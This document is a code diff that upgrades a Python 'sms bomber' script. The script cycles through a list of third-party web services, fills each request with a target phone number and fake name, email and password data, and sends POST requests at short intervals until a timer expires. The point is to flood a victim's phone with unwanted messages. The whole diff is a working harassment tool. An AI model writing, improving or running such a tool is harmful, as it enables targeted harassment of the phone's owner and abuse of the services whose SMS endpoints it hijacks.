@@ -4,77 +4,143 @@ import json
 import argparse
 import requests
 from itertools import cycle
-from randomData import *
+from time import time, sleep
+# my modules
+import randomData
+
 
 class Service:
 
-    def __init__(self, service):
+    def __init__(self, service, timeout):
         self.service = service
+        self.timeout = timeout
 
-    def parse_data(self, target):
+    def parse_data(self):
+        """ Parse data from service, creates datatype and payload vars """
         if "data" in self.service:
-            datatype = "data"
-            payload = self.service["data"]
+            self.datatype = "data"
+            self.payload = self.service["data"]
         elif "json" in self.service:
-            datatype = "json"
-            payload = self.service["json"]
+            self.datatype = "json"
+            self.payload = self.service["json"]
         else:
-            datatype = "url"
-            payload = self.service["url"]
+            self.datatype = "url"
+            self.payload = json.dumps({"url": self.service["url"]})
 
+    def replace_data(self, target):
+        """
+        Replace datas from payload to correct request and
+        loads payload variable to request.
+        """
+        # Replace data in payload
         for old, new in {
-            "'" : '"',
-            "%phone%" : target,
-            "%name%" : randomName(),
-            "%email%" : randomEmail(),
-            "%password%" : randomPass()
+            "'": '"',
+            "%phone%": target,
+            "%phone9%": target[1::],
+            "%name%": randomData.random_name(),
+            "%email%": randomData.random_email(),
+            "%password%": randomData.random_pass()
         }.items():
-            if old in payload:
-                payload = payload.replace(old, new)
+            if old in self.payload:
+                self.payload = self.payload.replace(old, new)
+        self.payload = json.loads(self.payload)
 
-        return payload, datatype
+    def _send_request(self):
+        """ Check payload, creating session and request, send request. """
+        url = self.service["url"]
+        with requests.Session() as session:
+            request = requests.Request("POST", url)
+            if self.datatype == "json":
+                request.json = self.payload
+            elif self.datatype == "data":
+                request.data = self.payload
+            else:
+                request.url = self.payload["url"]
+            request = request.prepare()
+            session.send(request, timeout=self.timeout)
 
-parser = argparse.ArgumentParser(
-    description="Simple sms bomber",
-    epilog="Example: ./bomber.py -t 79877415069"
-)
-parser.add_argument("-t", "--target", default=False, help="target phone number for bombing")
-parser.add_argument("-s", "--sms", default=False, type=int, help="sms count for bombing")
+
+def getDomainName(service):
+    """ Return domain name from service obj. """
+    url = service.service["url"]
+    return url.split('/')[2]
+
+
+def cleanPhoneNumber(phone):
+    """ Clean phone number from trash """
+    for trash in {" ", "(", ")", "-", "_", "'", '"'}:
+        if trash in phone:
+            phone = phone.replace(trash, "")
+    if phone[0] == '+':
+        phone = phone[1::]
+    if phone[0] == '8':
+        phone = '7' + phone[1::]
+    if phone[0] == '9':
+        phone = '7' + phone
+    return phone
+
+
+# Creating parser obj
+parser = argparse.ArgumentParser(description="Ultimate sms bomber")
+parser.add_argument(
+    "-t", "--target", default=False,
+    help="target phone number")
+parser.add_argument(
+    "-s", "--stop-time", default=False,
+    type=int, help="time in seconds")
+parser.add_argument(
+    "-i", "--interval", default=0.1,
+    type=float, help="intervals between requests in sec, default 0.1")
+parser.add_argument(
+    "--timeout", default=5,
+    type=int, help="timeout for request in seconds, default 5")
 args = parser.parse_args()
 
+# Args reductions for code quality
 target = args.target
-sms = args.sms
+stop_time = args.stop_time
+interval = args.interval
+timeout = args.timeout
 
+# If user don't use args ( -t, -s )
 if not target:
     target = input("enter phone num: ")
-if not sms:
-    sms = int(input("enter sms count: "))
+if not stop_time:
+    stop_time = int(input("enter time in seconds: "))
 
-if target[0] == '+':
-    target = target[1::]
-if target[0] == '8':
-    target = '7' + target[1::]
-if target[0] == '9':
-    target = '7' + target
+target = cleanPhoneNumber(target)
+
+if len(target) != 11 and len(target) != 7:
+    print("Invalid number format : %s" % target)
+    exit()
+
+stop_time = time() + stop_time
 
 with open("services.json", "r") as file:
     services = json.load(file)["services"]
 
-counter = 0
-for i in cycle(range(len(services))):
-    if counter >= sms:
+for elem in cycle(services):
+    if time() >= stop_time:
+        print("Time is out. Stopping bomber...")
         exit()
-    service = Service(services[i])
-    service.url = services[i]["url"]
-    service.payload, service.datatype = service.parse_data(target)
+    sleep(interval)
+    # Creating obj of service, parse data and send request
+    service = Service(elem, timeout)
+    domain_name = getDomainName(service)
+    service.parse_data()
+    service.replace_data(target)
+    # Catching errors
     try:
-        if service.datatype == "url":
-            requests.post(service.payload)
-        elif service.datatype == "data":
-            requests.post(service.url, data=eval(service.payload))
-        else:
-            requests.post(service.url, json=eval(service.payload))
-        print("ok")
-        counter += 1
-    except:
-        print("fail", service.url)
+        service._send_request()
+        print('Success - ' + domain_name)
+    except requests.exceptions.ReadTimeout:
+        print("FAIL - " + domain_name + " - ReadTimeout")
+    except requests.exceptions.ConnectTimeout:
+        print('FAIL - ' + domain_name + " - ConnectTimeout")
+    except requests.exceptions.ConnectionError:
+        print('FAIL - ' + domain_name + " - ConnectionError")
+    except Exception as err:
+        print(err)
+    except KeyboardInterrupt:
+        print("Stopping bombing...")
+        exit()
